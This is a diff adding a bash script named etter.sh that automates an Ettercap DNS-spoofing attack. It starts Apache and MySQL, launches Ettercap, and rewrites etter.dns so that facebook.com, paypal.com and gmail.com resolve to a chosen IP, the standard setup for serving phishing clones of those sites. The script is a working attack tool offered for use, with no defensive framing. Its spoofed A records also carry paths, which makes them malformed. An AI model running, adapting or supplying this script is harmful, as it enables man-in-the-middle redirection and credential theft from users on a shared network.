@@ -1,0 +1,181 @@
+#!/bin/bash
+
+#################### -- DECLARATIONS -- #######################################
+
+declare -r EtterPath="/etc/ettercap/etter.dns"
+
+addr="127.0.0.1"
+declare -i printHelp=0
+declare -i service=0
+declare -i ettercap=0
+declare -i stop=0
+declare -i foundError=0
+declare -i x=0
+
+################### -- COLORS -- ################################
+
+declare -r red="\033[1;31m"
+declare -r blue="\033[1;34m"
+declare -r green="\e[1;32m"
+declare -r yellow="\e[1;33m"
+declare -r purple="\e[5;35m"
+declare -r white="\e[1;37m"
+
+################## -- FUNCTIONS -- ##################################
+
+function welcome(){
+	
+sleep 0.3
+printf "$green ________ $red __________ $blue __________ $yellow ________ $purple  ________  \n"
+sleep 0.3
+printf "$green | ______|$red |___  ____|$blue |___  ____|$yellow | ______|$purple |  ____  | \n"
+sleep 0.3
+printf "$green | |_____ $red     | |    $blue     | |	 $yellow  | |_____$purple  | |____| | \n"
+sleep 0.3
+printf "$green | ______|$red     | |    $blue     | |	 $yellow  | ______|$purple |  ______| \n"
+sleep 0.3
+printf "$green | |_____ $red     | |    $blue     | |	 $yellow  | |_____ $purple | |\_\     \n"
+sleep 0.3
+printf "$green |_______|$red     |_|    $blue     |_|	 $yellow  |_______|$purple |_| \_\    \n"
+sleep 0.3
+printf "$white														\n"
+
+}
+
+function print_help(){
+	
+	echo
+	echo -e "${white}etter.sh -- Tool for Ettercap DNS file"
+	echo
+	echo "Usage : "
+	echo "			etter.sh [OPTIONS]"
+	echo
+	echo "[OPTIONS] :"
+	echo
+	echo "	-i --ip  YOUR IP	: set the selected ip as the redirection ip"
+	echo "				  127.0.0.1 is set as default"
+	echo "	-s --services		: if the -s option is used apache2 and mysql servers will start"
+	echo "				  requires the two services to be installed"
+	echo "	-x			: Stop all services"
+	echo "	-e --ettercap		: start ettercap in graphical mode"
+	echo "	-h --help		: printf this help and exit"
+	echo
+	echo -e "Example : ${red}etter --ip 192.168.1.1 -s -e"
+	echo
+}
+
+function start_services(){
+	echo
+	echo -e "$blue[Starting Apach2 service ...]"
+	service apache2 start
+	echo -e "$green[Apache2 service started]"
+	echo
+	sleep 2
+	echo -e "$blue[Starting mysql service ...]"
+	service mysql start
+	echo -e "$green[MySql service started]"
+	echo
+}
+
+function start_ettercap(){
+	echo
+	echo -e "$blue[Starting Ettercap ...]"
+	sleep 2
+	ettercap -G &
+	echo -e "$green[Ettercap started]"
+	echo
+}
+
+function stop_services(){
+	echo
+	echo -e "$red[Stopping Apach2 service ...]"
+	service apache2 stop
+	echo -e "$green[Apache2 service stopped]"
+	echo
+	sleep 2
+	echo -e "$red[Stopping mysql service ...]"
+	service mysql stop
+	echo -e "$green[MySql service stopped]"
+	echo
+}
+
+########################## -- SCRIPT -- #######################################
+
+if [ "$#" -eq 0 ]; then
+	print_help
+	exit 1
+fi
+
+while [ "$#" -ne 0 ]
+do
+	case "$1" in
+		-h | -help | --help) 
+			printHelp=1 
+			shift 
+			;;
+		-s | --service | --services)
+			service=1
+			shift
+			;;
+		-e | --ettercap)
+			ettercap=1
+			shift
+			;;
+		-x)
+			stop=1
+			shift
+			;;
+		-i | --ip)
+			addr="$2"
+			shift
+			;;
+		*)
+			shift
+			;;
+	esac
+done
+
+
+if [ "$printHelp" = "1" ]; then
+	print_help
+	exit 1
+fi
+
+if [ "$stop" = "1" ]; then
+	stop_services
+	exit 1
+fi
+
+## -- WELCOME -- ##
+welcome
+###################
+
+if [ "$service" = "1" ]; then
+	start_services
+fi
+
+if [ "$ettercap" = "1" ]; then
+	start_ettercap
+fi
+			
+echo -e "$blue[Starting the modification of etter.dsn file]"
+
+echo "*facebook.com		A	$addr/facebook.com" > $EtterPath
+echo "*paypal.com			A	$addr/paypal.com" >> $EtterPath
+echo "*gmail.com			A	$addr/gmail.com" >> $EtterPath
+echo >> $EtterPath
+echo "*.facebook.com		A	$addr/facebook.com" >> $EtterPath
+echo "*.paypal.com		A	$addr/paypal.com" >> $EtterPath
+echo "*.gmail.com			A	$addr/gmail.com" >> $EtterPath
+echo >> $EtterPath
+echo "www.facebook.com	A	$addr/facebook.com" >> $EtterPath
+echo "www.paypal.com		A	$addr/paypal.com" >> $EtterPath
+echo "www.gmail.com		A	$addr/gmail.com" >> $EtterPath
+
+sleep 2
+echo
+echo -e "$green[All Done !!]"
+
+#####################################################################
+#	echo "*microsoft.com		A	$addr/bullshit.com" > etter.dns	#
+#####################################################################
